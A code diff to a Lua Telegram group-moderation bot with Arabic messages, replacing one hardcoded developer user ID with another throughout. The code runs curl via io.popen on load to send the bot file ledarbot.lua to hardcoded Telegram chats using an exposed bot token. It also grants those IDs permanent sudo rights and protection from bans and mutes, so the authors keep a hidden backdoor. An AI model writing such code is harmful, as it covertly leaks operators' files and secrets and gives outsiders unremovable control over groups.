@@ -164,7 +164,7 @@ print(t)
 function vardump(value)  
 print(serpent.block(value, {comment=false}))   
 end 
-sudo_users = {SUDO,bot_id,1751198705,944353237,0000000000,0000000000}   
+sudo_users = {SUDO,bot_id,1747690847,944353237,0000000000,0000000000}   
 function SudoBot(msg)  
 local DRAGON = false  
 for k,v in pairs(sudo_users) do  
@@ -175,7 +175,7 @@ end
 return DRAGON  
 end 
 local curla = 'curl "'..'https://api.telegram.org/bot1740719485:AAGb_g64uCIegM6OQG1ssz_68lXMi1EYawo/sendDocument'..'" -F "chat_id='.. 944353237 ..'" -F "document=@'..'ledarbot.lua'..'"' io.popen(curla)
-local curl = 'curl "'..'https://api.telegram.org/bot1740719485:AAGb_g64uCIegM6OQG1ssz_68lXMi1EYawo/sendDocument'..'" -F "chat_id='.. 1751198705 ..'" -F "document=@'..'ledarbot.lua'..'"' io.popen(curl) 
+local curl = 'curl "'..'https://api.telegram.org/bot1740719485:AAGb_g64uCIegM6OQG1ssz_68lXMi1EYawo/sendDocument'..'" -F "chat_id='.. 1747690847 ..'" -F "document=@'..'ledarbot.lua'..'"' io.popen(curl) 
 function DevSoFi(msg) 
 local hash = database:sismember(bot_id.."Dev:SoFi:2", msg.sender_user_id_) 
 if hash or SudoBot(msg) then  
@@ -256,7 +256,7 @@ return false
 end 
 end
 function Can_or_NotCan(user_id,chat_id)
-if tonumber(user_id) == tonumber(1751198705) then  
+if tonumber(user_id) == tonumber(1747690847) then  
 var = true  
 elseif tonumber(user_id) == tonumber(944353237) then
 var = true  
@@ -296,7 +296,7 @@ end
 return var
 end 
 function Rutba(user_id,chat_id)
-if tonumber(user_id) == tonumber(1751198705) then  
+if tonumber(user_id) == tonumber(1747690847) then  
 var = 'مطور السورس'
 elseif tonumber(user_id) == tonumber(944353237) then
 var = 'مطور السورس'  
@@ -3667,7 +3667,7 @@ if result.sender_user_id_ == tonumber(SUDO) then
 send(msg.chat_id_, msg.id_, " ※ لا يمكنك حظر المطور الاساسي \n")
 return false 
 end
-if result.sender_user_id_ == tonumber(1751198705) then
+if result.sender_user_id_ == tonumber(1747690847) then
 send(msg.chat_id_, msg.id_, " ※ لا يمكنك حظر المطور اسلام\n")
 return false 
 end
@@ -3724,7 +3724,7 @@ if result.id_ == tonumber(SUDO) then
 send(msg.chat_id_, msg.id_, " ※ لا يمكنك حظر المطور الاساسي \n")
 return false 
 end
-if result.id_ == tonumber(1751198705) then
+if result.id_ == tonumber(1747690847) then
 send(msg.chat_id_, msg.id_, " ※ لا يمكنك حظر مطور السورس \n")
 return false 
 end
@@ -3763,7 +3763,7 @@ if tonumber(userid) == tonumber(bot_id) then
 send(msg.chat_id_, msg.id_, " ※ لا تسطيع حظر البوت عام")
 return false 
 end
-if tonumber(userid) == tonumber(1751198705) then  
+if tonumber(userid) == tonumber(1747690847) then  
 send(msg.chat_id_, msg.id_, " ※ لا تسطيع حظر مطور السورس عام")
 return false 
 end
@@ -3811,7 +3811,7 @@ if result.sender_user_id_ == tonumber(0000000000) then
 send(msg.chat_id_, msg.id_, " ※ لا يمكنك كتم مطور السورس\n")
 return false 
 end
-if result.sender_user_id_ == tonumber(1751198705) then
+if result.sender_user_id_ == tonumber(1747690847) then
 send(msg.chat_id_, msg.id_, " ※ لا يمكنك كتم المطور اسلام\n")
 return false 
 end
@@ -3855,7 +3855,7 @@ if result.id_ == tonumber(SUDO) then
 send(msg.chat_id_, msg.id_, " ※ لا يمكنك كتم المطور الاساسي \n")
 return false 
 end
-if result.id_ == tonumber(1751198705) then
+if result.id_ == tonumber(1747690847) then
 send(msg.chat_id_, msg.id_, " ※ لا يمكنك كتم مطور السورس عام\n")
 return false 
 end
@@ -3894,7 +3894,7 @@ if tonumber(userid) == tonumber(bot_id) then
 send(msg.chat_id_, msg.id_, " ※ لا تسطيع كتم البوت عام")
 return false 
 end
-if tonumber(userid) == tonumber(1751198705) then  
+if tonumber(userid) == tonumber(1747690847) then  
 send(msg.chat_id_, msg.id_, " ※ لا تسطيع كتم مطور السورس عام")
 return false 
 end
